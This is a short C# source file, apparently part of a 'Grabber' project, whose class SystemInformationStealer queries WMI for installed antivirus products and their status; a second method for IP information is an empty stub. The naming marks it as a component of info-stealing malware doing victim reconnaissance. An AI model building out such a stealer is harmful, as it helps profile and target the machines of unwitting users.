using System;
using System.Collections.Generic;
using System.Management;

namespace ConsoleApp1.Grabber
{
    internal class SystemInformationStealer
    {
        public string GetAV()
        {
            try
            {
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                    {
                        av.Add("Antivirus: " + searchResult["displayName"].ToString());
                        av.Add("\nStatus: " + searchResult["productState"].ToString());
                    }
                    if (av.Count == 0) return "N/A";
                    return string.Join(", ", av.ToArray());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return "User either has no Anti-Virus or failed to retrieve product.";
            }
        }

        public string IPInformation()
        {
            string ip_information = "";



            return ip_information;
        }
    }
}
